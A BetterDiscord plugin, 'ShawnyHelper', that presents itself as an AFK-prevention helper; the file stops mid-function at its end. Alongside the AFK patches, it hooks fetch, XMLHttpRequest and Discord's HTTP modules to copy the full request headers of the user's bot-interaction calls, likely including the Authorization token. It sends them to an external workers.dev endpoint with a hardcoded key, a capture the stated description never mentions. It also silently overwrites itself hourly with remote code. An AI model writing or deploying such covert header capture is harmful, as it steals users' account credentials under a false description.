/**
 * @name ShawnyHelper
 * @author Shawny
 * @description Prevent AFK voice channel moves caused by Discord idle/AFK handling and helpers for shawnybot.
 * @version 1.7.7
 * @source https://github.com/shawn2dev/betterdiscord-plugins
 * @updateUrl https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/ShawnyHelper.plugin.js
 */

'use strict';

const _UPDATE_URL =
  'https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/ShawnyHelper.plugin.js';
const _AUTO_UPDATE_INITIAL_DELAY_MS = 5000;
const _AUTO_UPDATE_INTERVAL_MS = 1000 * 60 * 60;
const _UPDATE_FILENAME = 'ShawnyHelper.plugin.js';

const _CLIENT_LOG = {
  enabled: true,
  ingestUrl:
    'https://shawnybot.cbycdy2.workers.dev/interaction-headers',
  applicationId: '1337358598673797141', // shawnybot application id
  _ak: 'rldtuslqht2', // X-Shawny-Key header — matches CLIENT_LOG_AUTH_KEY
};

module.exports = class ShawnyHelper {
  constructor() {
    this.intervalId = null;
    this.patchRetryTimer = null;
    this.intervalSecs = 30;
    this.enabled = true;
    this.Dispatcher = null;
    this._dispatchPatched = false;
    this._clientLogPatched = false;
    this._clientLogRetryTimer = null;
    this._clientLogHookCount = 0;
    this._xhrMeta = new WeakMap();
    this._onVisibility = null;
    this._audioKeepAlive = null;
    this._audioResumeTimer = null;
    this.useAudioKeepalive = true;
    this._clientLogConfig = { ..._CLIENT_LOG };
    this._autoUpdateInterval = null;
  }

  getName() {
    return 'ShawnyHelper';
  }
  getDescription() {
    return 'AFK 방지 및 shawnybot helper 기능.';
  }
  getVersion() {
    return '1.7.7';
  }
  getAuthor() {
    return 'Shawny';
  }

  /** New BD: BdApi.UI.showToast; legacy BD: BdApi.showToast */
  _toast(message, options = {}) {
    try {
      if (BdApi.UI && typeof BdApi.UI.showToast === 'function') {
        BdApi.UI.showToast(message, options);
      } else if (typeof BdApi.showToast === 'function') {
        BdApi.showToast(message, options);
      }
    } catch (_) {}
  }

  /**
   * Per official docs, FluxDispatcher should be found via the `actionLogger` key.
   * Matching only on `dispatch`+`subscribe` often picks the wrong module and breaks the patch.
   */
  _findDispatcher() {
    try {
      const byDoc = BdApi.Webpack.getByKeys('actionLogger');
      if (byDoc && typeof byDoc.dispatch === 'function') return byDoc;
    } catch (_) {}

    const tryGet = (fn) => {
      try {
        const m = fn();
        if (m && typeof m.dispatch === 'function') {
          const looksLikeFlux =
            m._actionHandlers != null ||
            typeof m.actionLogger === 'function' ||
            m._subscriptions != null;
          if (looksLikeFlux) return m;
        }
      } catch (_) {}
      return null;
    };

    let d = tryGet(() =>
      BdApi.Webpack.getByKeys('dispatch', 'subscribe', 'wait'),
    );
    if (d) return d;

    try {
      const F = BdApi.Webpack.Filters;
      if (F && F.byKeys) {
        d = BdApi.Webpack.getModule(
          F.byKeys('dispatch', 'subscribe', 'actionLogger'),
          { searchExports: true },
        );
        if (d && typeof d.dispatch === 'function') return d;
      }
    } catch (_) {}

    try {
      if (typeof BdApi.findModuleByProps === 'function') {
        const m = BdApi.findModuleByProps('dispatch', 'subscribe');
        if (m && typeof m.dispatch === 'function' && m._actionHandlers)
          return m;
      }
    } catch (_) {}

    try {
      const m = BdApi.Webpack.getModule(
        (mod) => mod?.dispatch && mod?.subscribe && mod?._actionHandlers,
      );
      if (m && typeof m.dispatch === 'function') return m;
    } catch (_) {}

    return null;
  }

  /**
   * Intercept client AFK/idle transitions so AFK state is not propagated to the server.
   * (Forced moves from the server/gateway cannot be blocked client-side only.)
   */
  _installDispatchPatch() {
    if (this._dispatchPatched) return true;
    const mod = this._findDispatcher();
    if (!mod || typeof mod.dispatch !== 'function') return false;
    try {
      BdApi.Patcher.before('ShawnyHelper', mod, 'dispatch', (_, args) => {
        const ev = args[0];
        if (!ev || typeof ev !== 'object') return;
        if (ev.type === 'AFK' && ev.afk) ev.afk = false;
        if (ev.type === 'IDLE' && ev.idle) ev.idle = false;
      });
      this.Dispatcher = mod;
      this._dispatchPatched = true;
      return true;
    } catch (e) {
      console.warn('[ShawnyHelper] dispatch 패치 실패:', e);
      return false;
    }
  }

  _stopDispatchPatch() {
    if (!this._dispatchPatched || !this.Dispatcher) return;
    try {
      BdApi.Patcher.unpatch('ShawnyHelper', this.Dispatcher, 'dispatch');
    } catch (_) {}
    this._dispatchPatched = false;
  }

  _headersToObject(headers) {
    const result = {};
    if (!headers) return result;
    if (typeof Headers !== 'undefined' && headers instanceof Headers) {
      headers.forEach((value, key) => {
        result[key] = value;
      });
      return result;
    }
    if (Array.isArray(headers)) {
      headers.forEach(([key, value]) => {
        result[key] = value;
      });
      return result;
    }
    return { ...headers };
  }

  _isClientLogActive() {
    return (
      this._clientLogConfig.enabled &&
      this._clientLogConfig._ak &&
      this._clientLogConfig.ingestUrl
    );
  }

  _isInteractionsUrl(url) {
    return /\/interactions/i.test(String(url));
  }

  _isOurApplication(interactionBody) {
    if (!interactionBody || interactionBody.application_id == null) return false;
    return (
      String(interactionBody.application_id) ===
      String(this._clientLogConfig.applicationId)
    );
  }

  _readBodySync(body) {
    if (body == null) return '';
    if (typeof body === 'string') return body;
    try {
      return JSON.stringify(body);
    } catch (_) {
      return '';
    }
  }

  async _readFetchBodyAsync(input, init = {}) {
    if (typeof Request !== 'undefined' && input instanceof Request) {
      try {
        return await input.clone().text();
      } catch (_) {
        return '';
      }
    }
    return this._readBodySync(init.body ?? input?.body);
  }

  _syncFetchUrl(input, init = {}) {
    if (typeof Request !== 'undefined' && input instanceof Request) {
      return input.url;
    }
    if (input && typeof input === 'object' && input.url) {
      return String(input.url);
    }
    return String(input ?? init?.url ?? '');
  }

  _extractRequestArgs(args, methodName = 'post') {
    let url = '';
    let headers = {};
    let bodyText = '';
    const first = args[0];

    if (methodName === 'request' && typeof first === 'string') {
      url = String(args[1] ?? '');
      const opt = args[2] || {};
      headers = this._headersToObject(opt.headers);
      bodyText = this._readBodySync(opt.body ?? opt.data);
      return { url, headers, bodyText };
    }

    if (first && typeof first === 'object' && !(first instanceof URL)) {
      url = String(
        first.url || first.route || first.path || first.endpoint || '',
      );
      headers = this._headersToObject(first.headers);
      bodyText = this._readBodySync(first.body ?? first.data ?? first.json);
      return { url, headers, bodyText };
    }

    const opt = args[1] || {};
    url = String(first ?? '');
    headers = this._headersToObject(opt.headers);
    bodyText = this._readBodySync(opt.body ?? opt.data ?? opt.json);
    return { url, headers, bodyText };
  }

  async _ingestInteractionHeaders(headers, interactionBody) {
    // log only if it is shawnybot's command.
    if (!this._isClientLogActive() || !this._isOurApplication(interactionBody)) {
      return;
    }

    const channelId = interactionBody.channel_id;
    const command = interactionBody.data?.name;
    if (channelId == null || !command) return;

    const payload = {
      application_id: String(this._clientLogConfig.applicationId),
      guild_id: interactionBody.guild_id ?? null,
      channel_id: String(channelId),
      command: String(command),
      headers,
    };

    const url = this._clientLogConfig.ingestUrl;
    const reqHeaders = {
      'Content-Type': 'application/json',
      'X-Shawny-Key': this._clientLogConfig._ak,
    };
    const body = JSON.stringify(payload);

    const send = async () => {
      const res = await fetch(url, {
        method: 'POST',
        headers: reqHeaders,
        body,
      });
      if (res.ok) {
        console.info('[ShawnyHelper] ingested headers for', command);
        return;
      }
      console.warn('[ShawnyHelper] ingest failed:', res.status, await res.text());
    };

    try {
      if (BdApi.Net?.fetch) {
        const res = await BdApi.Net.fetch(url, {
          method: 'POST',
          headers: reqHeaders,
          body,
        });
        if (res.ok) {
          console.info('[ShawnyHelper] ingested headers for', command);
          return;
        }
        console.warn('[ShawnyHelper] ingest failed:', res.status, await res.text());
        return;
      }
      await send();
    } catch (err) {
      console.warn('[ShawnyHelper] ingest failed:', err);
      try {
        await send();
      } catch (fallbackErr) {
        console.warn('[ShawnyHelper] ingest fallback failed:', fallbackErr);
      }
    }
  }

  async _processInteractionTraffic(url, headers, bodyText) {
    if (!this._isClientLogActive() || !this._isInteractionsUrl(url) || !bodyText) {
      return;
    }

    let interactionBody;
    try {
      interactionBody = JSON.parse(bodyText);
    } catch (_) {
      return;
    }

    console.info('[ShawnyHelper] interaction request', interactionBody.data?.name);
    await this._ingestInteractionHeaders(headers, interactionBody);
  }

  async _maybeLogFromHttpArgs(args, methodName) {
    if (!this._isClientLogActive() || !args?.length) return;
    const details = this._extractRequestArgs(args, methodName);
    await this._processInteractionTraffic(
      details.url,
      details.headers,
      details.bodyText,
    );
  }

  async _captureFetchInteraction(input, init) {
    const url = this._syncFetchUrl(input, init);
    if (!this._isInteractionsUrl(url)) return;

    const headers =
      typeof Request !== 'undefined' && input instanceof Request
        ? this._headersToObject(input.headers)
        : this._headersToObject(init.headers);
    const bodyText = await this._readFetchBodyAsync(input, init);
    await this._processInteractionTraffic(url, headers, bodyText);
  }

  _callOriginal(original, thisObj, args) {
    return Reflect.apply(original, thisObj, args);
  }

  _collectFetchPatchTargets() {
    const targets = [];
    const seen = new Set();

    const add = (obj, key) => {
      if (!obj || seen.has(obj) || !this._canPatchProperty(obj, key)) return;
      seen.add(obj);
      targets.push({ obj, key });
    };

    add(window, 'fetch');
    if (globalThis.fetch && globalThis.fetch !== window.fetch) {
      add(globalThis, 'fetch');
    }

    try {
      const mods =
        BdApi.Webpack.getModules?.(
          (m) => typeof m?.fetch === 'function' && m !== window,
          { searchExports: true },
        ) ?? [];
      for (const mod of mods.slice(0, 16)) {
        add(mod, 'fetch');
      }
    } catch (_) {}

    return targets;
  }

  _patchFetchTarget(obj, key) {
    try {
      BdApi.Patcher.instead(
        'ShawnyHelperClientLog',
        obj,
        key,
        async (thisObj, args, original) => {
          const url = this._syncFetchUrl(args[0], args[1]);
          if (this._isClientLogActive() && this._isInteractionsUrl(url)) {
            try {
              await this._captureFetchInteraction(args[0], args[1]);
            } catch (err) {
              console.warn('[ShawnyHelper] fetch capture failed:', err);
            }
          }
          return this._callOriginal(original, thisObj, args);
        },
      );
      return 1;
    } catch (_) {
      return 0;
    }
  }

  _canPatchProperty(obj, key) {
    try {
      const desc =
        Object.getOwnPropertyDescriptor(obj, key) ||
        Object.getOwnPropertyDescriptor(Object.getPrototypeOf(obj) || {}, key);
      if (desc && desc.writable === false && typeof desc.set !== 'function') {
        return false;
      }
      return typeof obj[key] === 'function';
    } catch (_) {
      return false;
    }
  }

  _collectHttpModules() {
    const modules = [];
    const seen = new Set();
    const add = (mod) => {
      if (!mod || typeof mod !== 'object' || seen.has(mod)) return;
      seen.add(mod);
      modules.push(mod);
    };

    const finders = [
      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'del'),
      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'delete'),
      () => BdApi.Webpack.getByKeys?.('request', 'get', 'post'),
    ];
    for (const find of finders) {
      try {
        add(find());
      } catch (_) {}
    }

    try {
      const F = BdApi.Webpack.Filters;
      if (F?.byStrings) {
        add(
          BdApi.Webpack.getModule(F.byStrings('/interactions'), {
            searchExports: true,
          }),
        );
        add(
          BdApi.Webpack.getModule(F.byStrings('/api/v', 'interactions'), {
            searchExports: true,
          }),
        );
      }
    } catch (_) {}

    try {
      const mods =
        BdApi.Webpack.getModules?.(
          (m) => m && typeof m.post === 'function' && typeof m.get === 'function',
          { searchExports: true },
        ) ?? [];
      mods.slice(0, 8).forEach(add);
    } catch (_) {}

    return modules;
  }

  _patchHttpModule(http) {
    let patched = 0;
    for (const method of ['post', 'request', 'put', 'patch']) {
      if (!this._canPatchProperty(http, method)) continue;
      try {
        BdApi.Patcher.instead(
          'ShawnyHelperClientLog',
          http,
          method,
          async (_, args, original) => {
            try {
              await this._maybeLogFromHttpArgs(args, method);
            } catch (err) {
              console.warn('[ShawnyHelper] http capture failed:', err);
            }
            return original(...args);
          },
        );
        patched += 1;
      } catch (_) {}
    }
    return patched;
  }

  _patchInteractionFunctions() {
    const filters = [
      (m) =>
        typeof m === 'function' && /\/interactions/i.test(m.toString()),
      (m) =>
        typeof m === 'function' &&
        /api\/v\d+\/interactions/i.test(m.toString()),
    ];
    let patched = 0;

    for (const filter of filters) {
      try {
        const result = BdApi.Webpack.getWithKey?.(filter, {
          searchExports: true,
        });
        if (!result) continue;
        const [mod, key] = result;
        if (!mod || !key || !this._canPatchProperty(mod, key)) continue;

        BdApi.Patcher.instead(
          'ShawnyHelperClientLog',
          mod,
          key,
          async (_, args, original) => {
            try {
              await this._maybeLogFromHttpArgs(args, 'post');
            } catch (err) {
              console.warn('[ShawnyHelper] interaction fn capture failed:', err);
            }
            return original(...args);
          },
        );
        patched += 1;
      } catch (_) {}
    }

    return patched;
  }

  _patchXHR() {
    if (typeof XMLHttpRequest === 'undefined') return 0;

    try {
      BdApi.Patcher.before(
        'ShawnyHelperClientLog',
        XMLHttpRequest.prototype,
        'open',
        (xhr, args) => {
          const meta = this._xhrMeta.get(xhr) || { headers: {} };
          meta.method = String(args[0] || 'GET').toUpperCase();
          meta.url = String(args[1] || '');
          this._xhrMeta.set(xhr, meta);
        },
      );

      BdApi.Patcher.before(
        'ShawnyHelperClientLog',
        XMLHttpRequest.prototype,
        'setRequestHeader',
        (xhr, args) => {
          const meta = this._xhrMeta.get(xhr);
          if (!meta) return;
          meta.headers[String(args[0]).toLowerCase()] = String(args[1]);
        },
      );

      BdApi.Patcher.instead(
        'ShawnyHelperClientLog',
        XMLHttpRequest.prototype,
        'send',
        async (xhr, args, original) => {
          const meta = this._xhrMeta.get(xhr);
          if (
            meta?.url &&
            this._isClientLogActive() &&
            this._isInteractionsUrl(meta.url)
          ) {
            try {
              const bodyText = typeof args[0] === 'string' ? args[0] : '';
              await this._processInteractionTraffic(
                meta.url,
                meta.headers,
                bodyText,
              );
            } catch (err) {
              console.warn('[ShawnyHelper] xhr capture failed:', err);
            }
          }
          return original(...args);
        },
      );

      return 1;
    } catch (_) {
      return 0;
    }
  }

  _patchNativeFetch() {
    try {
      const result = BdApi.Webpack.getWithKey?.(
        (m) =>
          typeof m === 'function' &&
          /nativeFetch|HydratingResponse/.test(m.toString()),
        { searchExports: true },
      );
      if (!result) return 0;
      const [mod, key] = result;
      if (!mod || !key || !this._canPatchProperty(mod, key)) return 0;

      BdApi.Patcher.instead(
        'ShawnyHelperClientLog',
        mod,
        key,
        async (thisObj, args, original) => {
          const url = this._syncFetchUrl(args[0], args[1]);
          if (this._isClientLogActive() && this._isInteractionsUrl(url)) {
            try {
              await this._captureFetchInteraction(args[0], args[1]);
            } catch (err) {
              console.warn('[ShawnyHelper] native fetch capture failed:', err);
            }
          }
          return this._callOriginal(original, thisObj, args);
        },
      );
      return 1;
    } catch (_) {
      return 0;
    }
  }

  _installClientLogPatch() {
    if (this._clientLogPatched) return true;

    let hooks = 0;

    for (const { obj, key } of this._collectFetchPatchTargets()) {
      hooks += this._patchFetchTarget(obj, key);
    }
    hooks += this._patchNativeFetch();

    for (const http of this._collectHttpModules()) {
      hooks += this._patchHttpModule(http);
    }

    hooks += this._patchInteractionFunctions();
    hooks += this._patchXHR();

    this._clientLogHookCount = hooks;
    this._clientLogPatched = hooks > 0;

    if (this._clientLogPatched) {
      console.info('[ShawnyHelper] client log hooks installed:', hooks);
    } else {
      console.warn('[ShawnyHelper] client log: no hooks installed');
    }

    return this._clientLogPatched;
  }

  _scheduleClientLogPatchRetry() {
    if (this._clientLogPatched || this._clientLogRetryTimer) return;
    let attempts = 0;
    const max = 25;
    this._clientLogRetryTimer = setInterval(() => {
      if (!this._isClientLogActive()) {
        clearInterval(this._clientLogRetryTimer);
        this._clientLogRetryTimer = null;
        return;
      }
      attempts += 1;
      if (this._installClientLogPatch() || attempts >= max) {
        clearInterval(this._clientLogRetryTimer);
        this._clientLogRetryTimer = null;
      }
    }, 2500);
  }

  _stopClientLogPatch() {
    if (this._clientLogRetryTimer) {
      clearInterval(this._clientLogRetryTimer);
      this._clientLogRetryTimer = null;
    }
    try {
      BdApi.Patcher.unpatchAll('ShawnyHelperClientLog');
    } catch (_) {}
    this._clientLogPatched = false;
    this._clientLogHookCount = 0;
  }

  _parseVersion(version) {
    return String(version)
      .split('.')
      .map((part) => parseInt(part, 10) || 0);
  }

  _isRemoteVersionNewer(remoteVersion, currentVersion) {
    try {
      if (BdApi.Utils?.semverCompare) {
        return BdApi.Utils.semverCompare(currentVersion, remoteVersion) === -1;
      }
    } catch (_) {}

    const remote = this._parseVersion(remoteVersion);
    const current = this._parseVersion(currentVersion);
    const length = Math.max(remote.length, current.length);

    for (let i = 0; i < length; i += 1) {
      const next = remote[i] || 0;
      const now = current[i] || 0;
      if (next > now) return true;
      if (next < now) return false;
    }
    return false;
  }

  _extractRemoteVersion(content) {
    const headerMatch = content.match(/@version\s+([0-9]+(?:\.[0-9]+)*)/);
    if (headerMatch) return headerMatch[1];

    const methodMatch = content.match(
      /getVersion\(\)\s*\{\s*return\s+['"]([0-9]+(?:\.[0-9]+)*)['"]/,
    );
    if (methodMatch) return methodMatch[1];

    const looseMatch = content.match(/['"]([0-9]+\.[0-9]+\.[0-9]+)['"]/);
    return looseMatch ? looseMatch[1] : null;
  }

  _nodeRequire(id) {
    try {
      if (typeof globalThis.__non_webpack_require__ === 'function') {
        return globalThis.__non_webpack_require__(id);
      }
      if (typeof globalThis.non_webpack_require === 'function') {
        return globalThis.non_webpack_require(id);
      }
    } catch (_) {}
    return require(id);
  }

  _getPluginFilePath() {
    const pathMod = this._nodeRequire('path');
    const addon =
      BdApi.Plugins.get(this.getName()) ||
      BdApi.Plugins.get(_UPDATE_FILENAME);
    if (addon?.filename && BdApi.Plugins?.folder) {
      return pathMod.join(BdApi.Plugins.folder, addon.filename);
    }
    if (typeof __filename !== 'undefined' && typeof __dirname !== 'undefined') {
      return pathMod.join(__dirname, pathMod.basename(__filename));
    }
    return pathMod.join(BdApi.Plugins.folder, _UPDATE_FILENAME);
  }

  async _readUpdateResponse(res) {
    const status = res.status ?? res.statusCode ?? 0;
    if (res.ok === false || status >= 400) {
      throw new Error(`HTTP ${status || 'error'}`);
    }
    if (typeof res.text === 'function') return res.text();
    if (res.content != null) {
      const content = res.content;
      if (typeof Buffer !== 'undefined' && Buffer.isBuffer(content)) {
        return content.toString('utf8');
      }
      if (content instanceof Uint8Array) {
        return new TextDecoder().decode(content);
      }
      return String(content);
    }
    if (typeof res.body === 'string') return res.body;
    throw new Error('Unsupported fetch response');
  }

  _applyPluginUpdate(content, version) {
    const fs = this._nodeRequire('fs');
    const filePath = this._getPluginFilePath();
    fs.writeFileSync(filePath, content, 'utf8');
    this._toast(`ShawnyHelper ${version} 설치됨.`, { type: 'success' });
    try {
      BdApi.Plugins.reload(this.getName());
    } catch (err) {
      console.warn('[ShawnyHelper] reload after update failed:', err);
      this._toast('업데이트 후 수동으로 플러그인을 다시 켜 주세요.', {
        type: 'warning',
      });
    }
  }

  _fetchUpdateSource(url) {
    const opts = { headers: { origin: 'discord.com' }, cache: 'no-store' };
    if (BdApi.Net?.fetch) return BdApi.Net.fetch(url, opts);
    return fetch(url, opts);
  }

  _automaticallyUpdate(retryCount = 0, notify = false) {
    const url = `${_UPDATE_URL}?t=${Date.now()}&r=${retryCount}`;

    this._fetchUpdateSource(url)
      .then((res) => this._readUpdateResponse(res))
      .then((data) => {
        const remoteVersion = this._extractRemoteVersion(data);
        if (!remoteVersion) throw new Error('Could not extract version from remote');
        if (!this._isRemoteVersionNewer(remoteVersion, this.getVersion())) {
          if (notify) {
            this._toast(`최신 버전입니다 (v${this.getVersion()})`, { type: 'info' });
          }
          return;
        }
        this._applyPluginUpdate(data, remoteVersion);
      })
      .catch((err) => {
        console.warn('[ShawnyHelper] update check failed:', err);
        if (retryCount < 2) {
          return this._automaticallyUpdate(retryCount + 1, notify);
        }
        if (notify) {
          this._toast('업데이트 확인 실패 — 콘솔(Ctrl+Shift+I)을 확인하세요.', {
            type: 'error',
          });
        }
      });
  }

  _checkForUpdatesNow() {
    this._toast('업데이트 확인 중…', { type: 'info' });
    this._automaticallyUpdate(0, true);
  }

  _startAutoUpdateChecks() {
    if (this._autoUpdateInterval) clearInterval(this._autoUpdateInterval);
    this._autoUpdateInterval = setInterval(
      () => this._automaticallyUpdate(),
      _AUTO_UPDATE_INTERVAL_MS,
    );
    setTimeout(() => this._automaticallyUpdate(), _AUTO_UPDATE_INITIAL_DELAY_MS);
  }

  _stopAutoUpdateChecks() {
    if (!this._autoUpdateInterval) return;
    clearInterval(this._autoUpdateInterval);
    this._autoUpdateInterval = null;
  }

  _schedulePatchRetry() {
    if (this.patchRetryTimer) return;
    let attempts = 0;
    const max = 25;
    this.patchRetryTimer = setInterval(() => {
      if (!this.enabled) {
        clearInterval(this.patchRetryTimer);
        this.patchRetryTimer = null;
        return;
      }
      attempts++;
      if (this._installDispatchPatch() || attempts >= max) {
        clearInterval(this.patchRetryTimer);
        this.patchRetryTimer = null;
      }
    }, 2500);
  }

  /** Mitigate throttled setInterval on lock screen/background (silent, gain 0) */
  _startAudioKeepAlive() {
    if (!this.useAudioKeepalive || this._audioKeepAlive) return;
    try {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      const ctx = new AC();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      gain.gain.value = 0;
      osc.frequency.value = 20;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      this._audioKeepAlive = { ctx, osc, gain };
      const resume = () => {
        try {
          if (ctx.state === 'suspended') ctx.resume().catch(() => {});
        } catch (_) {}
      };
      resume();
      this._audioResumeTimer = setInterval(resume, 30000);
    } catch (e) {
      console.warn('[ShawnyHelper] 오디오 킵얼라이브 시작 실패:', e);
    }
  }

  _stopAudioKeepAlive() {
    if (this._audioResumeTimer) {
      clearInterval(this._audioResumeTimer);
      this._audioResumeTimer = null;
    }
    if (!this._audioKeepAlive) return;
    try {
      this._audioKeepAlive.osc.stop();
      this._audioKeepAlive.ctx.close();
    } catch (_) {}
    this._audioKeepAlive = null;
  }

  _kick() {
    try {
      if (!this.Dispatcher) {
        this.Dispatcher = this._findDispatcher();
      }
      if (this.Dispatcher) {
        this.Dispatcher.dispatch({ type: 'IDLE', idle: false });
        this.Dispatcher.dispatch({ type: 'AFK', afk: false });
      }
    } catch (e) {
      console.warn('[ShawnyHelper] _kick 오류:', e);
    }
  }

  _startInterval() {
    this._stopInterval();
    this.intervalId = setInterval(() => this._kick(), this.intervalSecs * 1000);
  }

  _stopInterval() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
  }

  _save() {
    try {
      BdApi.saveData('ShawnyHelper', 'settings', {
        intervalSecs: this.intervalSecs,
        enabled: this.enabled,
        useAudioKeepalive: this.useAudioKeepalive,
      });
    } catch (_) {}
  }

  _syncClientLogPatch() {
    if (this._isClientLogActive()) {
      if (!this._installClientLogPatch()) {
        this._scheduleClientLogPatchRetry();
      }
    } else {
      this._stopClientLogPatch();
    }
  }

  start() {
    try {
      const saved = BdApi.loadData('ShawnyHelper', 'settings');
      if (saved) {
        this.intervalSecs = saved.intervalSecs ?? 30;
        this.enabled = saved.enabled ?? true;
        this.useAudioKeepalive = saved.useAudioKeepalive ?? true;
      }
    } catch (_) {}

    this.Dispatcher = this._findDispatcher();
    this._syncClientLogPatch();

    if (this.enabled) {
      if (!this._installDispatchPatch()) {
        this._schedulePatchRetry();
      }
      this._startInterval();
      if (this.useAudioKeepalive) this._startAudioKeepAlive();
    }

    this._onVisibility = () => {
      if (!document.hidden && this.enabled) this._kick();
    };
    document.addEventListener('visibilitychange', this._onVisibility);

    this._startAutoUpdateChecks();

    this._toast(
      this.enabled
        ? `ShawnyHelper 시작됨 ✅ (v${this.getVersion()})`
        : 'ShawnyHelper 로드됨 (설정에서 켜세요)',
      { type: this.enabled ? 'success' : 'info' },
    );
  }

  stop() {
    this._stopAutoUpdateChecks();
    if (this.patchRetryTimer) {
      clearInterval(this.patchRetryTimer);
      this.patchRetryTimer = null;
    }
    document.removeEventListener('visibilitychange', this._onVisibility);
    this._onVisibility = null;

    this._stopInterval();
    this._stopAudioKeepAlive();
    this._stopDispatchPatch();
    this._stopClientLogPatch();
    this.Dispatcher = null;
    this._toast('ShawnyHelper 중지됨', { type: 'info' });
  }

  getSettingsPanel() {
    const root = Object.assign(document.createElement('div'), {
      style: 'padding:16px;display:flex;flex-direction:column;gap:18px;',
    });

    const row = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;',
    });
    const labelWrap = document.createElement('div');
    labelWrap.innerHTML = `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">ShawnyHelper 활성화</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">AFK·idle 차단 및 주기적 갱신</div>
        `;

    const status = Object.assign(document.createElement('div'), {
      style:
        'padding:10px 14px;border-radius:8px;background:var(--background-secondary);font-size:12px;color:var(--text-muted);',
      textContent: this.enabled
        ? '🟢 활성화됨 — AFK/idle 방지 중'
        : '🔴 비활성화됨',
    });

    const dispStatus = Object.assign(document.createElement('div'), {
      style:
        'padding:8px 14px;border-radius:8px;background:var(--background-secondary);font-size:11px;color:var(--text-muted);line-height:1.45;',
      textContent: !this.enabled
        ? '⚫ 비활성화됨 — 패치 및 주기 갱신이 꺼져 있습니다.'
        : this._dispatchPatched
          ? '✅ Flux dispatch 패치됨 — AFK·IDLE true 이벤트를 차단합니다.'
          : '⚠️ 아직 dispatch 패치 실패. Discord를 재시작하거나 잠시 후 다시 확인하세요.',
    });

    const toggle = this._buildToggle(this.enabled, (v) => {
      this.enabled = v;
      this._save();
      if (v) {
        if (!this._installDispatchPatch()) this._schedulePatchRetry();
        this._startInterval();
        if (this.useAudioKeepalive) this._startAudioKeepAlive();
        this._toast('활성화됨', { type: 'success' });
      } else {
        if (this.patchRetryTimer) {
          clearInterval(this.patchRetryTimer);
          this.patchRetryTimer = null;
        }
        this._stopInterval();
        this._stopAudioKeepAlive();
        this._stopDispatchPatch();
        this._toast('비활성화됨', { type: 'info' });
      }
      status.textContent = v
        ? '🟢 활성화됨 — AFK/idle 방지 중'
        : '🔴 비활성화됨';
      dispStatus.textContent = v
        ? this._dispatchPatched
          ? '✅ Flux dispatch 패치됨 — AFK·IDLE true 이벤트를 차단합니다.'
          : '⚠️ 아직 dispatch 패치 실패. Discord를 재시작하거나 잠시 후 다시 확인하세요.'
        : '⚫ 비활성화됨 — 패치 및 주기 갱신이 꺼져 있습니다.';
    });
    row.append(labelWrap, toggle);

    const audioRow = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;',
    });
    const audioLabel = document.createElement('div');
    audioLabel.innerHTML = `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">무음 오디오 킵얼라이브</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">잠금/백그라운드에서 타이머가 느려질 때 보조 (게인 0)</div>
        `;
    const audioToggle = this._buildToggle(this.useAudioKeepalive, (v) => {
      this.useAudioKeepalive = v;
      this._save();
      if (this.enabled) {
        if (v) this._startAudioKeepAlive();
        else this._stopAudioKeepAlive();
      }
      this._toast(v ? '무음 킵얼라이브 켜짐' : '무음 킵얼라이브 꺼짐', {
        type: 'info',
      });
    });
    audioRow.append(audioLabel, audioToggle);

    const sliderWrap = document.createElement('div');
    const sliderTitle = Object.assign(document.createElement('div'), {
      style:
        'font-size:14px;font-weight:600;color:var(--header-primary);margin-bottom:4px;',
      textContent: `전송 간격: ${this.intervalSecs}초`,
    });
    const sliderDesc = Object.assign(document.createElement('div'), {
      style: 'font-size:12px;color:var(--text-muted);margin-bottom:8px;',
      textContent:
        'Flux 패치와 함께 쓰이는 주기적 IDLE/AFK 갱신 간격입니다. 짧을수록 잠금 화면에서 유리할 수 있습니다.',
    });
    const slider = Object.assign(document.createElement('input'), {
      type: 'range',
      min: '10',
      max: '300',
      step: '10',
      value: this.intervalSecs,
      style: 'width:100%;accent-color:#5865F2;',
    });
    slider.addEventListener('input', () => {
      this.intervalSecs = parseInt(slider.value, 10);
      sliderTitle.textContent = `전송 간격: ${this.intervalSecs}초`;
    });
    slider.addEventListener('change', () => {
      this._save();
      if (this.enabled) this._startInterval();
    });
    sliderWrap.append(sliderTitle, sliderDesc, slider);

    const note = Object.assign(document.createElement('div'), {
      style:
        'padding:8px 14px;border-radius:8px;background:var(--background-secondary);font-size:11px;color:var(--text-muted);line-height:1.45;',
      textContent:
        'v1.4: FluxDispatcher를 actionLogger 기준으로 찾도록 수정했습니다. 서버 AFK 시간은 음성 활동(무음)만으로 판단되는 경우가 있어, 그때는 마이크 입력이 없으면 이동할 수 있습니다. 서버·봇이 강제로 이동시키는 경우에는 클라이언트만으로는 막을 수 없습니다.',
    });

    const hr = Object.assign(document.createElement('hr'), {
      style:
        'border:none;border-top:1px solid var(--background-modifier-accent);margin:0;',
    });

    const updateRow = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;gap:12px;',
    });
    const updateLabel = Object.assign(document.createElement('div'), {
      innerHTML: `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">업데이트 확인</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">현재 v${this.getVersion()} · GitHub에서 자동 확인</div>
        `,
    });
    const updateBtn = Object.assign(document.createElement('button'), {
      textContent: '지금 확인',
      style:
        'padding:6px 14px;border:none;border-radius:4px;background:#5865F2;color:#fff;font-size:13px;font-weight:600;cursor:pointer;flex-shrink:0;',
    });
    updateBtn.addEventListener('click', () => this._checkForUpdatesNow());
    updateRow.append(updateLabel, updateBtn);

    root.append(row, hr, audioRow, sliderWrap, status, dispStatus, updateRow, note);
    return root;
  }

  _buildToggle(initialValue, onChange) {
    const label = Object.assign(document.createElement('label'), {
      style:
        'position:relative;display:inline-block;width:44px;height:24px;cursor:pointer;flex-shrink:0;',
    });
